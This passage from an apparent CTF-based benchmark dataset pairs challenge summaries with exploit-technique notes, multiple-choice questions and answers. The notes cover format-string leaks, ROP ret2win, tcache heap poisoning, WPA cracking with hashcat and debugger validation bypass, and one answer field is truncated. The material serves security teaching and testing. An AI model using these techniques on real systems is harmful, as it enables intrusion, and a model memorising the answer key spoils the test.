        "name": "Cat",
        "write_up": "dataset/raw/Cat.md",
        "type": "misc",
        "competition": [
            "0xL4ugh/2021",
            "https://ctftime.org/event/1248/tasks/"
        ],
        "score": -1.0,
        "max_score": 825,
        "difficulty": -1,
        "knowledge": [
            "For challenges involving format string vulnerabilities, iterating through the format specifiers (e.g., `%n$x` where `n` is an integer starting from 1 and incrementing) can be used to leak memory contents. This technique can be applied to locate and extract sensitive data such as flags from a program's memory. After extracting the raw memory data that looks like the flag or parts of it, tools like CyberChef can be used for decoding. This may involve operations like swapping endianness, converting from hex, and removing null bytes.\n   \n   Example payload: `%1$x%2$x%3$x` followed by decoding steps in CyberChef as needed.",
            "In challenges where buffer overflow vulnerabilities are present, especially in programs that contain a `win()` function or similar, a ret2win exploitation strategy can be successfully employed. This involves creating a ROP (Return-Oriented Programming) chain that overflows the buffer and redirects execution to the desired function that was not originally called by the program. It's crucial to note that for binaries compiled for a 64-bit architecture, the stack must be 16-byte aligned before calling `system()` to prevent segmentation faults. Crafting the payload often requires finding the buffer overflow offset using tools like `cyclic` from the pwntools suite, and carefully arranging ROP gadgets, `ret` instructions if needed for alignment, and the address of the `win` function.\n\n   Example script snippet:\n   ```python\n   from pwn import *\n   # Setup connection, context, and binaries\n   rop = ROP(exe)\n   ret = rop.find_gadget([\"ret\"])\n   rop.raw(offset * b\"A\")  # Padding to reach return address\n   rop.call(ret)  # 16-byte alignment if necessary\n   rop.call(exe.symbols.win)  # calling win function\n\n   # Send rop chain to the target\n   r.sendline(rop.chain())\n   ```"
        ],
        "question": [
            "When exploiting a format string vulnerability to leak sensitive data from memory, which of the following methods is appropriate for decoding the leaked memory data to retrieve a flag? - A. Converting the data directly into ASCII without modification. - B. Using CyberChef to swap endianness, convert from hex, and remove null bytes. - C. Applying a simple Base64 decode on the raw data. - D. Encrypting the data with an arbitrary key before decoding. ",
            "In the context of a buffer overflow vulnerability where the goal is to execute a `win()` function using ROP, what must be considered when dealing with a 64-bit binary to avoid a segmentation fault before calling `system()`? - A. Encrypting the `win()` function address before executing. - B. Ensuring there is an uninterrupted connection to the target system. - C. Keeping the stack 16-byte aligned before `system()` is called. - D. Overwriting the Global Offset Table (GOT). "
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Catastrophe",
        "write_up": "dataset/raw/Catastrophe.md",
        "type": "pwn",
        "competition": [
            "TSG/2021",
            "https://ctftime.org/event/1431/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "To defeat the safe-linking mechanism in a challenge where the glibc version is 2.32 or higher, leaking a heap address can be achieved by printing a freed chunk's address once inserted into the tcache. This method involves taking advantage of how chunks are encrypted in the tcache, specifically by observing the first time a chunk is inserted into a tcache list, where `e->next` is initialized to `&e->next >> 12` (heap base address) xor `tcache->entries[tc_idx]`, which equals zero when the list for a given size is empty.",
            "Implementing a [House of botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c) strategy provides a Write-What-Where primitive by poisoning the tcache, especially under scenarios where classic hooks like `__malloc_hook` or `__free_hook` are absent. This strategy involves creating overlapping chunks to exploit the tcache mechanism. Specifically, the steps include filling the tcache with 7 `0x100` sized chunks, followed by creating additional chunks and leveraging the allocation and deallocation sequence to manipulate the tcache's state, leading to a condition where arbitrary writes can be achieved by requesting chunks of specific sizes that interact with the poisoned tcache entry.\n\nExample Implementation:\n```python\n# Assuming appropriate functions `alloc`, `free`, and setup already exist\nfor i in range(7):\n   alloc(i, b\"A\" * 0x100, 0x100)  # Fill tcache with 0x100 sized chunks\nalloc(7, b\"B\" * 0x100, 0x100)  # prev chunk\nalloc(8, b\"C\" * 0x100, 0x100)  # a chunk\nalloc(9, b\"D\" * 0x10, 0x10)    # Barrier chunk to prevent consolidation with top chunk\nfor i in range(7):  \n   free(i)                       # Fill the tcache\nfree(8)                          # Move `a` chunk to unsorted bin\nfree(7)                          # Consolidate `prev` with `a` creating large chunk still in unsorted bin\nalloc(0, b\"E\" * 0x100, 0x100)   # Request a chunk to proceed with poison\n# At this point, a manipulation similar to the described approach can be employed to achieve write-what-where\n```"
        ],
        "question": [
            "In a scenario where the glibc version is 2.32 or higher, and a chunk has been free'd to defeat the safe-linking mechanism for leaking heap addresses, which operation reveals the address of the heap base by exploiting the initialization of `e->next` in a free'd chunk? - A. Printing the address of the chunk after reallocating it. - B. Printing the address of the chunk once it has been inserted in the tcache for the first time. - C. Printing the address of the chunk before freeing it. - D. Printing the address of the chunk after it has been removed from the tcache.",
            "Considering the implementation of the [House of botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c) technique for achieving a Write-What-Where primitive in a heap exploitation scenario without `__malloc_hook` or `__free_hook`, what is the crucial step that distinguishes this technique? - A. Allocating a single large chunk and then freeing it to bypass safe-linking. - B. Creating overlapping chunks through a specific sequence of allocations and frees, concluding with manipulating the state of the tcache to achieve arbitrary writes. - C. Overwriting the `__free_hook` with the address of system(). - D. Filling the tcache with chunks of varied sizes to cause a heap overflow."
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "Catchmouse",
        "write_up": "dataset/raw/Catchmouse.md",
        "type": "reverse",
        "competition": [
            "Defenit/2020",
            "https://ctftime.org/event/1060/tasks/"
        ],
        "score": 690,
        "max_score": 906,
        "difficulty": 0.7615894039735099,
        "knowledge": [
            "In reverse engineering challenges involving Android APKs that utilize both Java and native libraries (such as JNI libraries), it is beneficial to decompile Java code and to directly analyze the compiled native libraries. Tools like Procyon for Java decompilation and using `mmap` for executing native functions directly in C, as demonstrated with the JNI library functions in the challenge, are effective techniques. This approach can facilitate understanding complex application flows spanning both the Java and native code domains.",
            "For challenges involving cryptographic operations where the key is derived from application data (like scores or signatures), using dynamic instrumentation frameworks like Frida to intercept and manipulate running application logic is crucial. In this scenario, Frida was used to capture the base64 encoding of an application signature directly from memory. This strategy can uncover hidden or obfuscated cryptographic material, making it possible to reverse engineer the application's cryptographic procedures. \n\n   - Example of using Frida to capture base64 encoded strings:\n     ```javascript\n     Java.perform(function () {\n       Java.use(\"java.lang.StringBuilder\").toString.implementation = function() {\n         var ret = this.toString();\n         console.log(\"sb = \" + ret);\n         return ret;\n       };\n     });\n     ```",
            "When aiming to decrypt or reverse-engineer values protected by cryptographic operations (e.g., AES-128-CBC encryption), and when the key or IV is dynamically derived from user input or other application-specific data, it's effective to brute-force the possible range of input values if feasible (like scores within a certain interval). This approach, coupled with a script or program that rapidly iterates through the possible values, can be used to derive the correct input needed to reproduce the cryptographic key or IV. This is particularly applicable in contexts where the input range is known or can be inferred (e.g., a score range).\n\n   - Example of brute-forcing through a range of scores:\n     ```c\n     for(int i = 500; i < 1000; i++) {\n       long hash = i;\n       hash = ck1(0, 0, hash);\n       // Additional hash functions omitted for brevity\n       printf(\"%ld\\n\", hash);\n     }\n     ```"
        ],
        "question": [
            "When analyzing an Android APK that combines Java and native code, which decompilation and analysis strategy is effective for investigating the functionality encoded in native libraries? - A. Decompiling the APK with JD-GUI to analyze native libraries. - B. Using `grep` on the decompiled Java source to infer native library functionality. - C. Leveraging Procyon for Java decompilation and directly invoking native functions through `mmap` in C for native library analysis. - D. Running the APK in an emulator and observing the behavior to deduce native library functionality. ",
            "In the given scenario where cryptographic operations depend on dynamic application data, what method can be used to uncover concealed cryptographic materials by intercepting application logic at runtime? - A. Reverse engineering the application binary to statically extract cryptographic keys. - B. Using a dynamic instrumentation framework like Frida to capture real-time data manipulations, such as base64 encoding of application signatures. - C. Decompiling the app with static analysis tools to find encrypted strings. - D. Performing network traffic analysis to intercept encrypted data transmissions. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "CatGirl Breach",
        "write_up": "dataset/raw/CatGirl Breach.md",
        "type": "misc",
        "competition": [
            "CyBRICS/2020",
            "https://ctftime.org/event/1012/tasks/"
        ],
        "score": 273,
        "max_score": 500,
        "difficulty": 0.546,
        "knowledge": [
            "When analyzing a binary file that initiates a dropper malware, it's beneficial to extract embedded scripts or code. In this scenario, extract scripts using tools like 7zip and analyze their functionality. For instance, if a VBS script is used to execute a .bat file that converts integer sequences into a hexadecimal file, one can replicate the conversion logic in a more efficient programming language like Python to accelerate analysis. Example Python code to accelerate this conversion:\n```python\ndata = open('madoka.bat', 'rb').read()\nres = map(int, re.findall('\\d+', data))\nres = [x for x in res if x != 456]\nopen('out.exe', 'wb').write(\"\".join(map(chr, res)))\n```",
            "In scenarios where malware encrypts files with a simplistic encryption algorithm, reverse engineering the encryption function can allow for the creation of a decryption function by inverting operation orders and changing operation signs. This method is especially applicable when the encryption algorithm uses basic operations (additions, subtractions) and loops over data blocks. After deducing the encryption logic, one can implement a decoder in the same programming language to decrypt the payload or files. Example decryption function based on reversed operations:\n```python\ndef stage1_dec_8(data, key):\n    a = ctypes.c_uint32(data[0])\n    b = ctypes.c_uint32(data[1])\n    wtf = ctypes.c_uint32(0)\n    const = 0x9e3779b8\n    for i in range(32):\n        wtf.value -= const\n    for i in range(32):\n        wtf.value += const\n        a.value += (b.value << 4) + key[0] ^ b.value + wtf.value ^ (b.value >> 5) + key[1]\n        b.value += (a.value << 4) + key[2] ^ a.value + wtf.value ^ (a.value >> 5) + key[3]\n    return a.value, b.value\n```"
        ],
        "question": [
            "In the context of analyzing a binary file to uncover a dropper mechanism, which approach correctly translates a batch file sequence of integers into a usable format for further analysis? - A. Use 'map' and 're.findall' in Python to filter and convert the integers from the batch file into a binary file. - B. Manually transcribe each integer from the batch file into a text document and convert them to binary format using an online tool. - C. Directly execute the batch file on a secure machine to generate the required binary without needing to translate the integers. - D. Decode the sequence of integers using a base64 decoding process in a shell script to obtain the binary content.",
            "In the case of reversing a simple encryption algorithm used by malware for encrypting files, which strategy effectively creates a decryption function based on the given encryption logic? - A. Reverse the loop iteration direction and invert operation signs from \"-\" to \"+\" in the encryption algorithm to form the decryption function. - B. Employ advanced cryptanalytic techniques to break the encryption without needing to understand the malware's source code. - C. Copy the encryption function as-is and use it directly for decryption, assuming the process is symmetric without modifications. - D. Utilize a generic decryption tool available online, feeding it the encrypted file and hoping for a successful decryption without reverse engineering."
        ],
        "answer": [
            "A",
            "A"
        ]
    },
    {
        "name": "Caught Very Easily",
        "write_up": "dataset/raw/Caught Very Easily.md",
        "type": "The type of the challenge is OSINT (Open Source Intelligence).",
        "competition": [
            "vishwa/2022",
            "https://ctftime.org/event/1548/tasks/"
        ],
        "score": 482,
        "max_score": 500,
        "difficulty": 0.964,
        "knowledge": [
            "In OSINT challenges, clues in the flag format can direct the research path. For example, seeing \"EDB-ID\" in the flag format indicates the need to search for an exploit's ID in the Exploit Database. Applicable when the challenge hints at vulnerabilities, exploits, or specific cybersecurity databases.",
            "The context or background story provided in the challenge description can lead to targeted online searches. For instance, mentions of \"Ahmed Mansoor\" and \"jailbreak\" together with exploiting details like \"Pegasus Case\" guide towards searching for relevant exploit chains like the \"Trident Exploit Chain\" in cybersecurity contexts, thus narrowing down the search for precise vulnerabilities or exploits related to the narrative provided."
        ],
        "question": [
            "In an OSINT challenge, if the flag format hints at including an \"EDB-ID\", what is the most appropriate initial step in researching for the flag? - A. Search for Ahmed Mansoor's biography to understand his involvement with jailbreak attempts. - B. Begin with general searches around recent cybersecurity breaches. - C. Look up the Exploit Database for exploits matching the EDB-ID to find related vulnerabilities. - D. Directly search for jailbreak methods without focusing on exploit databases.",
            "Given a situation where an OSINT challenge description includes references to \"Ahmed Mansoor\", \"jailbreak\", and an exploit scenario such as the \"Pegasus Case\", how should participants proceed to narrow down their search for relevant information online? - A. Focus on general information about jailbreaking tools and methods without specific targets. - B. Look into the background of Ahmed Mansoor and why he might be associated with jailbreaking, leading to searches around the Pegasus Case and its associated exploits. - C. Ignore specifics like \"Pegasus Case\" and search for any exploit related to Ahmed Mansoor. - D. Search exclusively for Ahmed Mansoor's social media for potential clues ignoring jailbreak or spyware leads."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "CB2",
        "write_up": "dataset/raw/CB2.md",
        "type": "crypto",
        "competition": [
            "Sunshine/2019",
            "https://ctftime.org/event/767/tasks/"
        ],
        "score": 100,
        "max_score": 350,
        "difficulty": 0.2857142857142857,
        "knowledge": [
            "When faced with a seemingly random string of characters and numbers in a cryptographic challenge, consider analyzing the character set to identify common cipher patterns. For instance, if the character set fits within a recognizable range (such as ASCII values that correspond to the printable character range utilized by specific ciphers like ROT47), this can be a strong indicator of the cipher type. Once identified, use appropriate decoding tools or websites, such as dcode.fr, to decrypt the message. \n   - Example scenario: A cryptographic message uses a subset of ASCII characters indicating a ROT47 cipher. Use dcode.fr to decode.",
            "In challenges involving audio files that hint at encryption methods (like the mention of a numbers station or specific codewords), transcribe the audio to text and analyze it for patterns or clues. The use of the NATO Phonetic Alphabet usually suggests an initial layer of decryption to convert words into letters. Following this, additional hints (such as a mentioned shift number or codeword) may suggest further classic cipher techniques, including but not limited to Caesar Cipher, Polybius Square, or Vigen\u00e8re Cipher. Tools like dcode.fr or cryptii.com can assist in decrypting these with the provided clues.\n   - Example scenario: An audio message uses the NATO Phonetic Alphabet followed by a numerical shift hint. After converting to letters, apply the Caesar Cipher shift using online tools like dcode.fr to decrypt.",
            "For encrypted data that does not immediately appear to be plaintext or follows a complex encryption pattern, consider the context and hints provided within the challenge description for potential decryption methods. This can include multi-step decryption processes where initial decryption (e.g., Base64) reveals data that must be further decoded using other methods (e.g., XOR with a specific key, followed by Vigen\u00e8re Cipher). Such challenges may require iterative decryption using various keys and methods hinted at in the challenge's text.\n   - Example scenario: Encrypted data ends with '=', suggesting Base64 encoding. Upon decoding, if the result isn't plaintext, analyze hints for subsequent decryption steps, such as XOR with a key derived from the challenge text, followed by decryption with another method like the Vigen\u00e8re Cipher using a contextually relevant key."
        ],
        "question": [
            "When attempting to decrypt a message that appears to consist of a random string of ASCII characters, which method is likely being employed if the characters used fall within a specific subset indicating a ROT47 cipher? - A. Use MD5 hash cracking techniques to decrypt the message. - B. Apply a ROT13 decryption method directly on the string. - C. Utilize an online ROT47 decoder such as dcode.fr to decrypt the message. - D. Implement a complex RSA decryption algorithm to uncover the plaintext.",
            "In a scenario where an audio file is encountered during a cryptographic challenge, hinting at encryption with the use of the NATO Phonetic Alphabet and a specific numerical shift, what is a practical step to decipher the encrypted message? - A. Convert the phonetic alphabet directly into binary code and apply a quantum computing algorithm to decrypt. - B. Transcribe the NATO Phonetic Alphabet to letters and use a Caesar Cipher shift as indicated by the numerical hint, employing online tools like dcode.fr for decryption. - C. Record the audio backward to reveal hidden messages without any further decryption. - D. Analyze the audio's spectrogram in search of visual patterns, bypassing phonetic or numerical hints completely."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "CB3",
        "write_up": "dataset/raw/CB3.md",
        "type": "crypto",
        "competition": [
            "Sunshine/2019",
            "https://ctftime.org/event/767/tasks/"
        ],
        "score": 150,
        "max_score": 350,
        "difficulty": 0.42857142857142855,
        "knowledge": [
            "When encountering ciphers that seem to involve a fixed rotation of characters, such as ROT47, one can leverage online decoders or scripts to decipher the text. These tools are widely available and can handle a variety of rotation-based ciphers, making them invaluable for quickly cracking simple encoded messages. For a ROT47 example, a direct input into an online ROT47 decoder will yield the plaintext.",
            "For ciphers mentioned within audio files or similar mediums where information is given in a less straightforward manner, such as the usage of the NATO Phonetic Alphabet or distinctive patterns indicating a specific cipher (e.g., a limited character set suggesting a Polybius square cipher), the initial step is transcription followed by applying the hinted-at cipher technique. For a NATO Phonetic Alphabet encoded message hinting at a Caesar Cipher, transcribe the phonetic elements to letters, then use an appropriate Caesar Cipher decoder with the suggested shift, e.g., a shift of 6. For a message hinting at a Polybius square cipher due to a limited character set, utilize online tools or scripts to decode after determining the key and the structure of the square, such as excluding 'J' and using a distinctive codeword as the key.\n   \nExample payload for NATO Phonetic Alphabet decoded then shifted by Caesar Cipher:\n```\nTranscribed message: HKCGXKZNKOJKYULSGXIN\nDecoded with shift 6: bewaretheidesofmarch\n```"
        ],
        "question": [
            "When approaching a ROT47 cipher encryption, which is a type of cipher that rotates characters by a fixed number, a common strategy involves using an online ROT47 decoder. Given a string \"~C8 =39 A?2V8 73J:C 8FG7 AF?JJC2ECP\", which decryption approach should be used to decode the ciphertext efficiently? - A. Transcribe the string using the NATO Phonetic Alphabet and then apply a Caesar Cipher shift. - B. Use a substitution cipher where each letter is replaced by a letter some fixed number of positions down the alphabet. - C. Directly input the string into an online ROT47 decoder to obtain the plaintext. - D. Manually shift each character by 47 positions in the ASCII table. ",
            "In a challenge involving an audio file that, upon transcription using the NATO Phonetic Alphabet, hints at a Caesar Cipher shift according to the mentioned code number (e.g., \"6\" suggesting a shift of 6), which is the correct approach to decode the message \"HKCGXKZNKOJKYULSGXIN\" to reveal a plaintext? - A. Translate the transcribed message directly into an online ROT13 decoder for decryption. - B. Decode the message using a Polybius square cipher with a predetermined key. - C. Apply a Caesar Cipher with a shift opposite to the hinted number, in this case, a shift of -6. - D. Use an appropriate Caesar Cipher decoder with the hinted shift, in this case, a shift of 6, to decode the transcribed message. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "CEO",
        "write_up": "dataset/raw/CEO.md",
        "type": "misc",
        "competition": [
            "UIUCTF/2021",
            "https://ctftime.org/event/1372/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "To crack Wi-Fi passwords from a pcap file in CTF challenges, first convert the pcap file into the hccapx format using an online converter or the cap2hccapx tool from hashcat-utils for privacy-sensitive situations. This step prepares the file for the password cracking process with hashcat. Sample command for conversion (offline tool): `cap2hccapx.bin megacorp-01.cap wifi.hccapx`.",
            "Utilize hashcat with a well-known password dictionary like rockyou.txt to attempt cracking the converted hccapx file. The command `-m 2500` specifies the hash mode for WPA/WPA2, which is applicable when dealing with Wi-Fi handshake files. Sample command for cracking: `hashcat -m 2500 wifi.hccapx rockyou.txt --show`."
        ],
        "question": [
            "In the context of transforming Wi-Fi captured data for password cracking in cybersecurity challenges, which command correctly describes the process of converting a pcap file to an hccapx format using an offline tool for privacy-sensitive situations? - A. `cap2hccapx.bin megacorp-01.cap wifi.hccapx` - B. `tcpdump -r megacorp-01.cap -w wifi.hccapx` - C. `wireshark -T megacorp-01.cap -F hccapx` - D. `aircrack-ng megacorp-01.cap -J wifi`",
            "Which hashcat command is accurately tailored for cracking WPA/WPA2 passwords, utilizing the converted hccapx file against the rockyou.txt password dictionary in a Capture the Flag (CTF) context? - A. `hashcat -a 3 wifi.hccapx rockyou.txt --force` - B. `hashcat -m 2500 wifi.hccapx rockyou.txt --show` - C. `john --format=hccapx wifi.hccapx --wordlist=rockyou.txt` - D. `aircrack-ng wifi.hccapx -w rockyou.txt`"
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "cerberus",
        "write_up": "dataset/raw/cerberus.md",
        "type": "crypto",
        "competition": [
            "SECCON/2021",
            "https://ctftime.org/event/1458/tasks/"
        ],
        "score": 227,
        "max_score": 428,
        "difficulty": 0.530373831775701,
        "knowledge": [
            "When dealing with CBC mode encryption challenges, a padding oracle attack can be effectively utilized to decrypt ciphertext without the need for the encryption key. This process involves manipulating the IV and ciphertext in such a way that one can recover plaintext by querying the decryption oracle and observing its response to padding errors. Specifically, by appending a controlled input (Cr) after the ciphertext and IV, adjusting this input based on the decryption oracle's feedback allows for the gradual revelation of the plaintext. This technique exploits the property of CBC mode where the decryption of a block is XORed with the previous ciphertext block (or IV for the first block) to produce the original plaintext.",
            "To construct a decryption oracle from scratch in scenarios where the encryption service does not directly provide one, one can manipulate the IV to control the output of the decryption process. By carefully crafting a new IV (`new_IV = IV ^ PIV`, where `PIV` is derived from the padding oracle attack), it's possible to force the decryption process to output as if it were decrypting with the original IV, thus effectively turning the service into a decryption oracle. This approach allows for the decryption of arbitrary ciphertexts by submitting them along with the crafted IV to the service and applying the decryption oracle in a padding oracle attack fashion to recover the plaintext.\n\nExample payloads cannot be directly derived from this explanation as it requires the context of the target encryption system and its responses to craft the payload based on observed outputs."
        ],
        "question": [
            "In the context of CBC mode encryption, using a padding oracle attack, how can the last block of plaintext be determined from the given ciphertext? - A. By directly decrypting the ciphertext with the encryption key. - B. By decrypting the ciphertext block and then XORing it with the IV. - C. By appending the IV after the ciphertext and manipulating the next blocks to reveal the plaintext upon decryption. - D. By appending two arbitrary blocks after the IV and ciphertext, then leveraging decryption oracle feedback to reveal the plaintext.",
            "When attempting to create a decryption oracle from scratch for arbitrary ciphertext decryption, which operation correctly describes the crafting of a new IV (`new_IV`) to control the decryption output as if decrypting with the original IV? - A. `new_IV = IV / PIV`, where `PIV` represents the plaintext of an IV block derived through a padding oracle attack. - B. `new_IV = IV * PIV`, where `PIV` represents the plaintext of an IV block derived through a padding oracle attack. - C. `new_IV = IV ^ PIV`, where `PIV` is the output produced by XORing `prev_out_from_IV` with the original IV. - D. `new_IV = IV - PIV`, where `PIV` represents the plaintext of an IV block derived through a padding oracle attack."
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Cereal Killer 01",
        "write_up": "dataset/raw/Cereal Killer 01.md",
        "type": "The type of this CTF challenge is **reverse**.",
        "competition": [
            "DEADFACE/2023",
            "https://ctftime.org/event/2031/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When encountering a binary that decrypts and prints a flag based on input validation, analyze the program's flow to manipulate the validation check. This can be achieved by using a debugger to set the condition-checking register to a value that bypasses the input validation, thereby forcing the program to execute the block of code that reveals the flag. This technique is particularly useful when direct modification of input is not feasible due to complex validation mechanisms or when the input's correct value is unknown. \n   - Sample technique using GDB: \n     ```\n     gef> set $eax=0\n     gef> continue\n     ```\n   This sets the result of the comparison (typically stored in the `eax` register on x86 architectures) to 0 (indicating success in most C comparisons), bypassing the need to meet the actual condition.",
            "For obfuscated or encrypted strings within a binary that are decrypted or manipulated at runtime based on certain conditions, static analysis alone may not be sufficient to reveal the value. Running the binary within a debugger, dynamically altering the flow to bypass checks, and observing the memory or register states can unmask such strings. In some cases, manual intervention in the program's execution flow via debugger commands allows analysts to directly access the decryption or manipulation routines, making the reverser's task easier. \n   - As shown in the solution, manipulating the program's execution just after a key comparison (`memcmp` in this case) and before the conditional jump that depends on this comparison can allow the execution of the desired code block that handles decryption or printing of hidden information."
        ],
        "question": [
            "In a scenario where you are analyzing a binary file that validates input before decrypting and printing a secret message, which GDB command sequence would you use to manipulate the validation check and force the execution of the block that prints the flag? - A. `gef> set $eax=0; gef> next` - B. `gef> set $ebx=1; gef> continue` - C. `gef> set $ecx=0; gef> step` - D. `gef> set $eax=0; gef> continue` ",
            "Upon encountering an encrypted or obfuscated string in a binary, which approach is effective for revealing the string if static analysis does not suffice, especially when conditions for decryption are tied to specific program executions? - A. Use a decompiler to statically retrieve the string without executing the binary. - B. Directly modify the binary file to remove the encryption function. - C. In a debugger, manipulate the execution flow to bypass the input validation checks and reach the decryption routine. - D. Use an automated tool to guess the encryption key based on known encryption algorithms. "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Chad _The Jaw_ Bronson",
        "write_up": "dataset/raw/Chad _The Jaw_ Bronson.md",
        "type": "misc",
        "competition": [
            "BYUCTF/2022",
            "https://ctftime.org/event/1660/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When encountering challenges that integrate steganography with social media platforms for clues, it is important to analyze media files (e.g., audio) for hidden messages that could direct to social media profiles. These profiles may contain further hints or data crucial for progressing in the challenge. Utilizing spectrogram views on audio files can reveal hidden text or clues that are not immediately apparent through listening alone.",
            "For text-based puzzles that involve a sequence of repetitive phrases or patterns, consider applying classical cipher techniques. In scenarios where the puzzle presents structured text repetition, the a1z26 cipher (where numbers are substituted for letters of the alphabet) can be an effective method for decoding messages. The decoded message may serve as a key or password in subsequent steps of the challenge, such as unlocking password-protected archives. \n   \n   Example decoded message: `iamthechaddest213`"
        ],
        "question": [
            "In a CTF challenge, participants are given an audio file with no visible clues on how to proceed. Which of the following steps should be taken first to uncover potential hidden messages within the audio file that can lead to clues posted on social media profiles? - A. Convert the audio file to a .wav format and search for hidden files embedded within. - B. Upload the audio file directly to social media in hopes of triggering an automated response containing clues. - C. Listen to the audio file at various speeds and reversals to identify any hidden verbal messages. - D. Open the audio file in a spectrogram view to reveal any visual representations of hidden text or clues.",
            "When you come across a CTF challenge involving a text file filled with a repetitive phrase pattern, which cipher technique would be most appropriate to decode a potential message that could be used as a password for a protected file? - A. Use a Caesar cipher shifting the letters by a fixed number to reveal the hidden message. - B. Apply the a1z26 cipher, converting the number of words per line into letters to decode the message. - C. Decrypt the message using a Vigen\u00e8re cipher and the phrase itself as the key. - D. Perform a frequency analysis to identify the most common letters and attempt to decode the message."
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "CHANGE_VM",
        "write_up": "dataset/raw/CHANGE_VM.md",
        "type": "reverse",
        "competition": [
            "justCTF/2019",
            "https://ctftime.org/event/943/tasks/"
        ],
        "score": 347,
        "max_score": 500,
        "difficulty": 0.694,
        "knowledge": [
            "When dealing with binaries that involve complex calculations or virtual machines (VMs) to validate input, symbolic execution tools like angr can be applied to automate the extraction of correct inputs or passwords without manually reverse engineering the binary's logic. This method involves creating a symbolic file (with a symbolic size if necessary), simulating user input, and then exploring execution paths to find a state where the output indicates success (e.g., a message about a correct password).\n\nExample of using angr for automated password extraction:\n```python\nimport angr\nimport claripy\n\n# Load the binary\np = angr.Project(\"binary_name\")\n\n# Create a symbolic buffer of the expected input length\nsymsize = claripy.BVS('inputLength', 64)  # Adjust the size as necessary\nsimfile = angr.SimFile('/dev/stdin', size=symsize)\n\n# Create an entry state with the symbolic file as stdin\nstate = p.factory.entry_state(stdin=simfile)\n\n# Setup a simulation manager\nsimgr = p.factory.simulation_manager(state)\n\n# Explore the binary looking for a state that prints \"Good password\" or similar success message\nsimgr.explore(find=lambda s: b\"Good\" in s.posix.dumps(1))\n\n# Extract and print the found state and the correct input\nif simgr.found:\n    found_state = simgr.found[0]\n    print((b\"Correct Input: \" + found_state.posix.dumps(0)).decode())\n```",
            "For challenges involving SystemVerilog files that describe state machines, mapping the transitions and conditions between states can allow the construction of input sequences (flags). This method involves parsing the SystemVerilog file to identify conditions for state transitions and then either traversing the states forward or backward (depending on the challenge setup) to reconstruct the sequence of inputs ('di') that lead to the solution state.\n\nExample approach for mapping and traversing state transitions in SystemVerilog challenges:\n```python\n# Pseudo-code for extracting state transition conditions and traversing the map\nentries = {}\n\n# Parse the SystemVerilog file to fill the 'entries' dictionary with state transitions\n# This would usually involve reading lines, identifying the transition conditions, and mapping them accordingly\n\ndef traverse_states_to_construct_flag(initial_state, target_state):\n    current_state = initial_state\n    flag_parts = []\n    while current_state != target_state:\n        # Assuming 'entries' maps current_state to a tuple of (next_state, input_required_for_transition)\n        next_state, input_char = entries[current_state]\n        flag_parts.append(input_char)\n        current_state = next_state\n    return ''.join(flag_parts)\n\n# Example call to the function (parameters like initial_state and target_state would be challenge-specific)\nflag = traverse_states_to_construct_flag(0, solution_state)\nprint(f\"Flag: {flag}\")\n```\n\nThese approaches abstractly cover tackling challenges involving binary analysis with virtual machines and signal or state-driven logic in hardware description languages, providing strategies that can be tailored to specific CTF challenges."
        ],
        "question": [
            "In a challenge where you need to find the correct password for a Linux binary, employing a symbolic execution tool like angr can significantly automate the process. Given the following script setup, which symbolic operation allows for automatic extraction of the password when the binary outputs a success message?  ```python import angr import claripy  p = angr.Project(\"binary_name\") symsize = claripy.BVS('inputLength', 64) # Adjust the size as necessary for the binary's expected input. simfile = angr.SimFile('/dev/stdin', size=symsize) state = p.factory.entry_state(stdin=simfile) simgr = p.factory.simulation_manager(state)  simgr.explore(find=lambda s: b\"Good\" in s.posix.dumps(1)) if simgr.found: found_state = simgr.found[0] print((b\"Correct Input: \" + found_state.posix.dumps(0)).decode()) ```  - A. `simgr.run()` - B. `simgr.explore(find=lambda s: b\"Good\" in s.posix.dumps(1))` - C. `simgr.step()` - D. `simgr.move()` ",
            "When dealing with a SystemVerilog file for a Capture The Flag (CTF) challenge that describes a finite state machine, understanding how to traverse the defined states based on input conditions is essential. Based on the provided approach, what step is crucial for constructing the input sequence that leads to the solution state?  ```python entries = {} # Pseudo-code snippets for mapping state transitions and constructing the flag omitted for brevity  def traverse_states_to_construct_flag(initial_state, target_state): current_state = initial_state flag_parts = [] while current_state != target_state: next_state, input_char = entries[current_state] flag_parts.append(input_char) current_state = next_state return ''.join(flag_parts) ```  - A. Defining input buffer size with claripy. - B. Initializing a `SimulationManager` with an entry state. - C. Extracting the correct sequence of inputs leading to the target state by traversing mapped state transitions. - D. Performing symbolic execution with `angr.Project()`. "
        ],
        "answer": [
            "B. `simgr.explore(find=lambda s",
            "C. Extracting the correct sequence of inputs leading to the target state by traversing mapped state transitions."
        ]
    },
    {
        "name": "Chaos",
        "write_up": "dataset/raw/Chaos.md",
        "type": "crypto",
        "competition": [
            "ISITDTU/2019/Quals",
            "https://ctftime.org/event/803/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
